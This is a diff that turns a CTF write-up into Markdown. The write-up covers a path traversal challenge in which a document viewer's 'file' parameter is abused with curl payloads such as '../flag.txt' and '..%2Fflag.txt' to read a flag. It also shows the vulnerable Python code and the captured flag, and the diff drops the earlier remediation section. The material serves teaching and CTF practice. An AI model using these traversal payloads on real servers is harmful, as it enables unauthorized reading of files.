@@ -1,178 +1,167 @@
-dotdotslashflagtxt — Path Traversal Writeup
+# dotdotslashflagtxt — boroCTF 2026
 
-CTF: boroCTF 2026
-Challenge: dotdotslashflagtxt
-Category: Web
-Points: 100
+## Challenge Information
 
-Description
+**Category:** Web
+**Points:** 100
 
-A company left their internal document viewer exposed. It only shows approved files... or does it?
+### Description
 
-The challenge provides a simple document viewer exposing several text files:
+> A company left their internal document viewer exposed. It only shows approved files... or does it?
 
+The challenge provides a simple document viewer exposing three text files:
+
+```text
 readme.txt
 notes.txt
 about.txt
-Initial Reconnaissance
+```
 
-Opening the application reveals links such as:
+---
 
+## Initial Analysis
+
+Opening the application revealed the following URLs:
+
+```text
 /view?file=readme.txt
 /view?file=notes.txt
 /view?file=about.txt
+```
 
-The parameter:
+Immediately, the `file` parameter stood out as the likely attack surface.
 
-file=
+Viewing the page source confirmed that the application simply passed filenames through the URL:
 
-immediately becomes the primary attack surface.
-
-Source code inspection confirms the application dynamically loads files based on user input:
-
+```html
 <a href="/view?file=readme.txt">readme.txt</a>
 <a href="/view?file=notes.txt">notes.txt</a>
 <a href="/view?file=about.txt">about.txt</a>
+```
 
-This strongly suggests a potential file inclusion or path traversal vulnerability.
+The challenge title itself was also a major hint:
 
-Vulnerability
+```text
+dotdotslashflagtxt
+```
 
-The application appears to concatenate user input directly into a filesystem path.
+which strongly suggests:
 
-A vulnerable implementation would look similar to:
+```text
+../flag.txt
+```
 
-filename = request.args.get("file")
-return open("documents/" + filename).read()
+---
 
-If path traversal sequences are not filtered, an attacker can escape the intended directory using:
+## Exploitation
 
-../
-Exploitation
-Attempt 1 — Direct Flag Access
+The first test was attempting to access the flag directly:
+
+```bash
 curl -s "$BASE/view?file=flag.txt"
-
-Response:
-
-File not found
-
-The flag is not inside the allowed documents directory.
-
-Attempt 2 — Path Traversal
-curl -s "$BASE/view?file=../flag.txt"
-
-Response:
-
-boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
-
-Success.
-
-The traversal sequence:
-
-../
-
-moves one directory up, allowing access to files outside the intended document folder.
-
-Additional Testing
-
-Further traversal attempts:
-
-curl -s "$BASE/view?file=../../flag.txt"
-curl -s "$BASE/view?file=../../../flag.txt"
-
-returned:
-
-File not found
-
-This indicated that the flag was located exactly one directory above the documents folder.
-
-URL Encoded Variant
-
-The same attack also works using URL encoding:
-
-curl -s "$BASE/view?file=..%2Fflag.txt"
-
-where:
-
-%2F = /
+```
 
 Result:
 
+```text
+File not found
+```
+
+Since the flag was not inside the public documents directory, the next step was trying path traversal.
+
+```bash
+curl -s "$BASE/view?file=../flag.txt"
+```
+
+Response:
+
+```text
 boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
-Attack Flow
-User Input
-     ↓
-/view?file=readme.txt
-     ↓
-Server Reads File
+```
 
-Modified Input
-     ↓
-/view?file=../flag.txt
-     ↓
-Escape Documents Directory
-     ↓
-Read Sensitive File
-     ↓
-Flag Retrieved
-Flag
-boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
-Root Cause
+Success.
 
-The application trusted user-controlled file paths without validation.
+The application failed to sanitize traversal sequences, allowing access to files outside the intended directory.
 
-Vulnerable logic:
+For completeness, additional traversal attempts were tested:
 
+```bash
+curl -s "$BASE/view?file=../../flag.txt"
+curl -s "$BASE/view?file=../../../flag.txt"
+```
+
+Both returned:
+
+```text
+File not found
+```
+
+This confirmed that the flag was located exactly one directory above the public documents folder.
+
+---
+
+## Alternative Payload
+
+The same attack also worked using URL encoding:
+
+```bash
+curl -s "$BASE/view?file=..%2Fflag.txt"
+```
+
+where:
+
+```text
+%2F = /
+```
+
+---
+
+## Root Cause
+
+The application trusted user-controlled file paths.
+
+A vulnerable implementation would resemble:
+
+```python
+filename = request.args.get("file")
 open("documents/" + filename)
+```
 
-User input:
+When supplied with:
 
+```text
 ../flag.txt
+```
 
-Resulting path:
+the resulting path becomes:
 
+```text
 documents/../flag.txt
+```
 
 which resolves to:
 
+```text
 flag.txt
+```
 
 outside the intended directory.
 
-Remediation
-Validate User Input
+---
 
-Reject traversal sequences:
+## Flag
 
-if ".." in filename:
-    return "Invalid file"
-Use an Allowlist
-ALLOWED = {
-    "readme.txt",
-    "notes.txt",
-    "about.txt"
-}
-Resolve Canonical Paths
-import os
+```text
+boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
+```
 
-path = os.path.realpath(
-    os.path.join("documents", filename)
-)
+---
 
-if not path.startswith(
-    os.path.realpath("documents")
-):
-    raise Exception("Traversal blocked")
-Lessons Learned
-Always inspect URL parameters.
-File viewers frequently suffer from path traversal bugs.
-The sequence ../ should be one of the first tests during web enumeration.
-URL encoding can sometimes bypass weak filters.
-Never trust user-controlled filesystem paths.
-Tools Used
-Browser
-curl
-Manual testing
-Takeaway
+## Takeaway
 
-This challenge demonstrates a classic Directory Traversal (Path Traversal) vulnerability. By replacing an approved filename with ../flag.txt, it was possible to escape the intended documents directory and read arbitrary files from the server, ultimately revealing the flag.
+This challenge demonstrates a classic Path Traversal vulnerability.
+
+The title practically revealed the solution: `../flag.txt`.
+
+By manipulating the `file` parameter, it was possible to escape the document directory and read arbitrary files from the server, ultimately exposing the flag.
+
